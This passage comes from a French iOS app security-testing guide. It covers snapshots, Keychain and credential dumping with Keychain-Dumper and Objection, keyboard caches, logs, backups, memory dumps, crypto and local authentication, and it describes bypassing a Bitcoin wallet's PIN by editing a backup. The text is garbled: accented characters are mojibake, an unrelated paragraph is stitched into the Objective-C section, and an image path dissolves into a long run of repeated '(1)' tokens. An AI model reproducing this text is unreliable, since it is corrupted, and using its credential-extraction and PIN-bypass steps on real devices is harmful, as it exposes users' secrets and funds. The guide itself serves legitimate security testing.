√Ä moins que l'iPhone ne soit jailbreak√©, l'attaquant doit avoir acc√®s au p√©riph√©rique d√©verrouill√© pour voir ces captures d'√©cran. Par d√©faut, la derni√®re capture d'√©cran est stock√©e dans le sandbox de l'application dans le dossier `Library/Caches/Snapshots/` ou `Library/SplashBoard/Snapshots` (les ordinateurs de confiance ne peuvent pas acc√©der au syst√®me de fichiers √† partir de iOS 7.0).

Une fa√ßon de pr√©venir ce comportement ind√©sirable est de mettre un √©cran vide ou de supprimer les donn√©es sensibles avant de prendre la capture d'√©cran en utilisant la fonction `ApplicationDidEnterBackground()`.

Voici un exemple de m√©thode de rem√©diation qui d√©finira une capture d'√©cran par d√©faut.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C est un langage de programmation utilis√© pour d√©velopper des applications iOS. Il est bas√© sur le langage C et ajoute des fonctionnalit√©s orient√©es objet. Dans le contexte du piratage d'applications iOS, il est important de comprendre les bases d'Objective-C pour pouvoir analyser et exploiter les vuln√©rabilit√©s potentielles.

Les techniques de piratage d'applications iOS peuvent inclure l'analyse de code source, l'injection de code, la r√©tro-ing√©nierie et l'exploitation de vuln√©rabilit√©s connues. Il est essentiel de comprendre comment fonctionne Objective-C pour pouvoir identifier et exploiter ces vuln√©rabilit√©s.

Lors de l'analyse d'une application iOS, il est utile de conna√Ætre les principaux concepts d'Objective-C, tels que les classes, les m√©thodes, les propri√©t√©s et les messages. Ces concepts sont utilis√©s pour cr√©er des applications iOS et peuvent √©galement √™tre utilis√©s pour identifier les vuln√©rabilit√©s potentielles.

En utilisant des outils de piratage sp√©cifiques √† iOS, tels que Cycript, Clutch et Frida, il est possible d'analyser et de manipuler le code Objective-C d'une application. Ces outils permettent de contourner les m√©canismes de s√©curit√© et d'explorer les fonctionnalit√©s internes de l'application.

Il est important de noter que le piratage d'applications iOS sans autorisation est ill√©gal. Les techniques de piratage d'applications iOS doivent √™tre utilis√©es √† des fins √©thiques, telles que la r√©alisation de tests de p√©n√©tration autoris√©s ou la s√©curisation des applications contre les attaques potentielles.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Cela d√©finit l'image de fond sur `overlayImage.png` chaque fois que l'application passe en arri√®re-plan. Cela emp√™che les fuites de donn√©es sensibles car `overlayImage.png` remplacera toujours la vue actuelle.

### Keychain

Des outils comme [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) peuvent √™tre utilis√©s pour extraire le trousseau (le p√©riph√©rique doit √™tre jailbreak√©).\
Vous pouvez √©galement utiliser `ios keychain dump` depuis [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** est la classe parfaite pour **stocker le nom d'utilisateur et le mot de passe dans le trousseau**. Pas besoin de s'emb√™ter avec NSUserDefaults ni avec un wrapper pour le trousseau.\
Une fois que l'utilisateur est connect√©, vous pouvez stocker son nom d'utilisateur et son mot de passe dans le trousseau :
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Vous pouvez utiliser **Objection's** `ios nsurlcredentialstorage dump` pour extraire ces secrets.

## Claviers personnalis√©s/Cache du clavier

Depuis iOS 8.0, Apple permet d'installer des extensions personnalis√©es pour iOS, comme des claviers personnalis√©s.\
Les claviers install√©s peuvent √™tre g√©r√©s via **R√©glages** > **G√©n√©ral** > **Clavier** > **Claviers**.\
Les claviers personnalis√©s peuvent √™tre utilis√©s pour **capturer** les **frappes** et les envoyer au serveur de l'attaquant. Cependant, notez que **les claviers personnalis√©s n√©cessitant une connectivit√© r√©seau seront signal√©s √† l'utilisateur.**\
De plus, **l'utilisateur peut passer √† un clavier diff√©rent** (plus fiable) **pour saisir les identifiants.**

De plus, **les applications peuvent emp√™cher leurs utilisateurs d'utiliser des claviers personnalis√©s** dans l'application (ou du moins pour les parties sensibles de l'application).

{% hint style="warning" %}
Il est recommand√© de ne pas autoriser les claviers tiers si vous estimez que les utilisateurs n'en auront pas besoin.
{% endhint %}

Notez que, en raison de la correction automatique et des suggestions automatiques, le clavier iOS par d√©faut capturera et stockera chaque mot non standard dans un fichier cache si l'attribut **secureTextEntry** n'est pas d√©fini sur **true** ou si **autoCorrectionType** n'est pas d√©fini sur **UITextAutoCorrectionTypeNo**.

Par d√©faut, les claviers **stockent ce cache** √† l'int√©rieur du sandbox des applications dans le fichier `Library/Keyboard/{locale}-dynamic-text.dat` ou dans `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Cependant, il se peut qu'il enregistre les donn√©es ailleurs.\
Il est possible de r√©initialiser le cache dans _**R√©glages**_ > _**G√©n√©ral**_ > _**R√©initialiser**_ > _**R√©initialiser le dictionnaire du clavier**_

{% hint style="info" %}
Par cons√©quent, **v√©rifiez toujours ces fichiers** et recherchez d'√©ventuelles **informations sensibles**.\
**Intercepter le trafic r√©seau** est une autre fa√ßon de v√©rifier si le clavier personnalis√© envoie les frappes √† un serveur distant.
{% endhint %}

Le protocole [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) est utilis√© pour le cache du clavier. Les classes UITextField, UITextView et UISearchBar prennent automatiquement en charge ce protocole et offrent les propri√©t√©s suivantes :

* `var autocorrectionType: UITextAutocorrectionType` d√©termine si la correction automatique est activ√©e pendant la saisie. Lorsque la correction automatique est activ√©e, l'objet texte suit les mots inconnus et sugg√®re des remplacements appropri√©s, rempla√ßant automatiquement le texte saisi √† moins que l'utilisateur ne remplace le remplacement. La valeur par d√©faut de cette propri√©t√© est `UITextAutocorrectionTypeDefault`, qui active la correction automatique pour la plupart des m√©thodes de saisie.
* `var secureTextEntry: BOOL` d√©termine si la copie de texte et le cache de texte sont d√©sactiv√©s et masque le texte saisi pour `UITextField`. La valeur par d√©faut de cette propri√©t√© est `NO`.

**Pour identifier ce comportement dans le code :**

* Recherchez des impl√©mentations similaires dans le code source, telles que
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Ouvrez les fichiers xib et storyboard dans l'`Interface Builder` de Xcode et v√©rifiez les √©tats de `Secure Text Entry` et `Correction` dans l'`Inspecteur d'attributs` pour l'objet appropri√©.

L'application doit emp√™cher la mise en cache des informations sensibles saisies dans les champs de texte. Vous pouvez emp√™cher la mise en cache en la d√©sactivant de mani√®re programm√©e, en utilisant la directive `textObject.autocorrectionType = UITextAutocorrectionTypeNo` dans les UITextFields, UITextViews et UISearchBars souhait√©s. Pour les donn√©es qui doivent √™tre masqu√©es, telles que les codes PIN et les mots de passe, d√©finissez `textObject.secureTextEntry` sur `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Journaux**

Les moyens les plus courants de d√©boguer du code consistent √† utiliser des journaux, et l'application **peut imprimer des informations sensibles dans les journaux**.\
Dans les versions iOS 6 et ant√©rieures, les journaux √©taient lisibles par tous (une application malveillante pouvait lire les journaux d'autres applications et extraire des informations sensibles √† partir de l√†). **De nos jours, les applications ne peuvent acc√©der qu'√† leurs propres journaux**.

Cependant, un **attaquant** ayant **un acc√®s physique** √† un appareil **d√©verrouill√©** peut le connecter √† un ordinateur et **lire les journaux** (notez que les journaux √©crits sur le disque par une application ne sont pas supprim√©s si l'application est d√©sinstall√©e).

Il est recommand√© de **naviguer √† travers toutes les pages** de l'application et **interagir** avec **chaque** √©l√©ment de l'interface utilisateur et **fonctionnalit√©** et fournir du texte d'entr√©e dans tous les champs de texte et **revoir les journaux** √† la recherche d'**informations** **sensibles** expos√©es.

Utilisez les mots-cl√©s suivants pour v√©rifier le code source de l'application pour les d√©clarations de journalisation pr√©d√©finies et personnalis√©es :

* Pour les fonctions pr√©d√©finies et int√©gr√©es :
* NSLog
* NSAssert
* NSCAssert
* fprintf
* Pour les fonctions personnalis√©es :
* Logging
* Logfile

**Surveillance des journaux syst√®me**

De nombreuses applications enregistrent des messages informatifs (et potentiellement sensibles) dans le journal de la console. Le journal contient √©galement des rapports de plantage et d'autres informations utiles.

Vous pouvez utiliser ces outils :
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Vous pouvez collecter les journaux de console via la fen√™tre **Appareils** de Xcode de la mani√®re suivante :

1. Lancez Xcode.
2. Connectez votre appareil √† votre ordinateur h√¥te.
3. Choisissez **Fen√™tre** -> **Appareils et simulateurs**.
4. Cliquez sur votre appareil iOS connect√© dans la section de gauche de la fen√™tre Appareils.
5. Reproduisez le probl√®me.
6. Cliquez sur le bouton **Ouvrir la console** situ√© dans la partie sup√©rieure droite de la fen√™tre Appareils pour afficher les journaux de console dans une fen√™tre s√©par√©e.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sauvegardes

iOS inclut des fonctionnalit√©s de sauvegarde automatique qui cr√©ent des copies des donn√©es stock√©es sur l'appareil. Vous pouvez **effectuer des sauvegardes iOS** depuis votre ordinateur h√¥te en utilisant iTunes (jusqu'√† macOS Catalina) ou Finder (√† partir de macOS Catalina), ou via la fonctionnalit√© de sauvegarde iCloud. Dans les deux cas, la sauvegarde inclut presque toutes les donn√©es stock√©es sur l'appareil iOS, √† l'exception des donn√©es hautement sensibles telles que les informations Apple Pay et les param√®tres Touch ID.

√âtant donn√© qu'iOS sauvegarde les applications install√©es et leurs donn√©es, une pr√©occupation √©vidente est de savoir si des **donn√©es sensibles de l'utilisateur** stock√©es par l'application pourraient **fuir involontairement par la sauvegarde**. Une autre pr√©occupation, bien que moins √©vidente, est de savoir si des **param√®tres de configuration sensibles utilis√©s pour prot√©ger les donn√©es ou restreindre la fonctionnalit√© de l'application pourraient √™tre modifi√©s pour changer le comportement de l'application apr√®s la restauration d'une sauvegarde modifi√©e**. Les deux pr√©occupations sont valides et ces vuln√©rabilit√©s se sont av√©r√©es exister dans un grand nombre d'applications aujourd'hui.

Une sauvegarde d'un appareil sur lequel une application mobile a √©t√© install√©e inclura tous les sous-r√©pertoires (√† l'exception de `Library/Caches/`) et fichiers du [r√©pertoire priv√© de l'application](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12).\
Par cons√©quent, **√©vitez de stocker des donn√©es sensibles en texte brut dans l'un des fichiers ou dossiers qui se trouvent dans le r√©pertoire priv√© de l'application ou ses sous-r√©pertoires**.

Bien que tous les fichiers dans `Documents/` et `Library/Application Support/` soient toujours sauvegard√©s par d√©faut, vous pouvez [exclure des fichiers de la sauvegarde](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28) en appelant `NSURL setResourceValue:forKey:error:` avec la cl√© `NSURLIsExcludedFromBackupKey`.\
Vous pouvez utiliser les propri√©t√©s du syst√®me de fichiers [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey) et [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey) pour exclure des fichiers et des r√©pertoires des sauvegardes.

{% hint style="warning" %}
Par cons√©quent, lors de la v√©rification de la sauvegarde d'une application, vous devez v√©rifier si **des informations sensibles** sont accessibles et si vous pouvez **modifier un comportement sensible** de l'application en **modifiant certains param√®tres de la sauvegarde** et en restaurant la sauvegarde.
{% endhint %}

**Comment tester**

Commencez par **cr√©er une sauvegarde de l'appareil** (vous pouvez le faire en utilisant Finder) et trouvez o√π la sauvegarde est stock√©e. La documentation officielle d'Apple vous aidera √† [localiser les sauvegardes de votre iPhone, iPad et iPod touch](https://support.apple.com/fr-fr/HT204215).

Une fois que vous avez trouv√© la sauvegarde de l'appareil (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), vous pouvez commencer √† rechercher des informations sensibles en utilisant par exemple grep, ou en utilisant des outils comme [iMazing](https://imazing.com)).

Pour savoir si une sauvegarde est chiffr√©e, vous pouvez v√©rifier la cl√© nomm√©e "IsEncrypted" du fichier "Manifest.plist", situ√© √† la racine du r√©pertoire de sauvegarde. L'exemple suivant montre une configuration indiquant que la sauvegarde est chiffr√©e :
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Au cas o√π vous auriez besoin de travailler avec une sauvegarde chiffr√©e, il existe quelques scripts Python dans le r√©f√©rentiel GitHub de DinoSec, tels que **backup_tool.py** et **backup_passwd.py**, qui serviront de bon point de d√©part. Cependant, notez qu'ils pourraient ne pas fonctionner avec les derni√®res versions d'iTunes/Finder et pourraient n√©cessiter des ajustements.

Vous pouvez √©galement utiliser l'outil **iOSbackup** pour lire et extraire facilement des fichiers √† partir d'une sauvegarde iOS chiffr√©e par mot de passe.

**Comment modifier le comportement**

Dans l'application open source de portefeuille Bitcoin, Bither, vous verrez qu'il est possible de configurer un code PIN pour verrouiller l'interface utilisateur. Ce code PIN est stock√© dans le fichier `net.bither.plist` sous la cl√© **pin_code**. Si vous supprimez cette cl√© de ce fichier plist dans la sauvegarde et restaurez la sauvegarde, vous pourrez acc√©der au portefeuille.

## Test de la m√©moire pour les donn√©es sensibles

√Ä un moment donn√©, des informations sensibles vont √™tre stock√©es en m√©moire. L'objectif est de s'assurer que ces informations sont expos√©es aussi bri√®vement que possible.

Pour examiner la m√©moire d'une application, commencez par cr√©er un **dump de m√©moire**. Alternativement, vous pouvez **analyser la m√©moire en temps r√©el** avec, par exemple, un d√©bogueur. Quelle que soit la m√©thode que vous utilisez, il s'agit d'un processus tr√®s sujet aux erreurs car les dumps fournissent les donn√©es laiss√©es par les fonctions ex√©cut√©es et vous pourriez manquer d'ex√©cuter des √©tapes critiques. De plus, il est assez facile de passer √† c√¥t√© de donn√©es lors de l'analyse, √† moins de conna√Ætre l'empreinte des donn√©es que vous recherchez (soit sa valeur exacte, soit son format). Par exemple, si l'application chiffre selon une cl√© sym√©trique g√©n√©r√©e de mani√®re al√©atoire, il est tr√®s peu probable que vous rep√©riez la cl√© en m√©moire √† moins de trouver sa valeur par d'autres moyens.

**R√©cup√©ration et analyse d'un dump de m√©moire**

Que vous utilisiez un appareil jailbreak√© ou non jailbreak√©, vous pouvez extraire la m√©moire du processus de l'application avec [objection](https://github.com/sensepost/objection) et [Fridump](https://github.com/Nightbringer21/fridump).

Une fois que la m√©moire a √©t√© extraite (par exemple, dans un fichier appel√© "memory"), en fonction de la nature des donn√©es que vous recherchez, vous aurez besoin d'un ensemble d'outils diff√©rents pour traiter et analyser ce dump de m√©moire. Par exemple, si vous vous concentrez sur les cha√Ænes de caract√®res, il pourrait vous suffire d'ex√©cuter la commande `strings` ou `rabin2 -zz` pour extraire ces cha√Ænes de caract√®res.
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Ouvrez `strings.txt` dans votre √©diteur pr√©f√©r√© et fouillez-le pour identifier les informations sensibles.

Cependant, si vous souhaitez inspecter un autre type de donn√©es, vous pr√©f√©rerez utiliser radare2 et ses capacit√©s de recherche. Consultez l'aide de radare2 sur la commande de recherche (`/?`) pour plus d'informations et une liste d'options. Ce qui suit ne montre qu'un sous-ensemble d'entre elles :
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**Analyse de la m√©moire en temps d'ex√©cution**

En utilisant [**r2frida**](https://github.com/nowsecure/r2frida), vous pouvez analyser et inspecter la m√©moire de l'application pendant son ex√©cution, sans avoir besoin de la d√©charger. Par exemple, vous pouvez ex√©cuter les commandes de recherche pr√©c√©dentes depuis r2frida et rechercher une cha√Æne de caract√®res, des valeurs hexad√©cimales, etc. Lorsque vous le faites, n'oubliez pas de pr√©fixer la commande de recherche (et toute autre commande sp√©cifique √† r2frida) avec un backslash `\` apr√®s avoir d√©marr√© la session avec `r2 frida://usb//<nom_de_votre_application>`.

## Cryptographie d√©faillante

### Mauvaises pratiques de gestion des cl√©s

Certains d√©veloppeurs enregistrent des donn√©es sensibles dans le stockage local et les chiffrent avec une cl√© cod√©e en dur/pr√©visible dans le code. Cela ne devrait pas √™tre fait car une r√©tro-ing√©nierie pourrait permettre aux attaquants d'extraire les informations confidentielles.

### Utilisation d'algorithmes non s√©curis√©s et/ou obsol√®tes

Les d√©veloppeurs ne devraient pas utiliser d'**algorithmes obsol√®tes** pour effectuer des **v√©rifications** d'autorisation, **stocker** ou **envoyer** des donn√©es. Certains de ces algorithmes sont : RC4, MD4, MD5, SHA1... Si des **hachages** sont utilis√©s pour stocker des mots de passe par exemple, des hachages r√©sistants aux attaques par force brute devraient √™tre utilis√©s avec un sel.

### V√©rification

Les principales v√©rifications √† effectuer consistent √† rechercher des mots de passe/secrets **cod√©s en dur** dans le code, ou si ceux-ci sont **pr√©visibles**, et si le code utilise des algorithmes de **cryptographie** faibles.

Il est int√©ressant de savoir que vous pouvez **surveiller** automatiquement certaines **biblioth√®ques de cryptographie** en utilisant **objection** avec :
```swift
ios monitor crypt
```
Pour **plus d'informations** sur les API et les biblioth√®ques de cryptographie iOS, acc√©dez √† [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Authentification locale

Le testeur doit √™tre conscient que **l'authentification locale doit toujours √™tre appliqu√©e √† un point d'acc√®s distant** ou bas√©e sur une primitive cryptographique. Les attaquants peuvent contourner facilement l'authentification locale si aucune donn√©e ne retourne du processus d'authentification.

Le [**framework d'authentification locale**](https://developer.apple.com/documentation/localauthentication) fournit un ensemble d'API permettant aux d√©veloppeurs d'√©tendre une bo√Æte de dialogue d'authentification √† un utilisateur. Dans le contexte de la connexion √† un service distant, il est possible (et recommand√©) d'utiliser le [trousseau](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) pour mettre en ≈ìuvre l'authentification locale.

Le capteur d'empreintes digitales est g√©r√© par le [coprocesseur de s√©curit√© SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) et n'expose pas les donn√©es d'empreintes digitales √† d'autres parties du syst√®me. √Ä c√¥t√© de Touch ID, Apple a introduit _Face ID_ : qui permet l'authentification bas√©e sur la reconnaissance faciale.

Les d√©veloppeurs ont deux options pour int√©grer l'authentification Touch ID/Face ID :

* `LocalAuthentication.framework` est une API de haut niveau qui peut √™tre utilis√©e pour **authentifier l'utilisateur via Touch ID**. L'application ne peut pas acc√©der aux donn√©es associ√©es √† l'empreinte digitale enregistr√©e et est seulement notifi√©e si l'authentification a r√©ussi.
* `Security.framework` est une API de niveau inf√©rieur pour acc√©der aux [services du trousseau](https://developer.apple.com/documentation/security/keychain\_services). C'est une option s√©curis√©e si votre application a besoin de **prot√©ger certaines donn√©es secr√®tes avec une authentification biom√©trique**, car le contr√¥le d'acc√®s est g√©r√© au niveau du syst√®me et ne peut pas √™tre contourn√© facilement. `Security.framework` dispose d'une API C, mais il existe plusieurs [enveloppes open source disponibles](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), rendant l'acc√®s au trousseau aussi simple que pour NSUserDefaults.

{% hint style="danger" %}
Veuillez noter que l'utilisation de `LocalAuthentication.framework` ou de `Security.framework` peut √™tre contourn√©e par un attaquant car elle ne renvoie qu'un bool√©en et aucune donn√©e pour continuer. Voir [Don't touch me that way, par David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) pour plus de d√©tails.
{% endhint %}

### Framework d'authentification locale

Les d√©veloppeurs peuvent afficher une **invite d'authentification** en utilisant la fonction **`evaluatePolicy`** de la classe **`LAContext`**. Deux politiques disponibles d√©finissent les formes d'authentification acceptables :

* `deviceOwnerAuthentication`(Swift) ou `LAPolicyDeviceOwnerAuthentication`(Objective-C) : Lorsque disponible, l'utilisateur est invit√© √† effectuer une authentification Touch ID. Si Touch ID n'est pas activ√©, le code d'acc√®s de l'appareil est demand√© √† la place. Si le code d'acc√®s de l'appareil n'est pas activ√©, l'√©valuation de la politique √©choue.
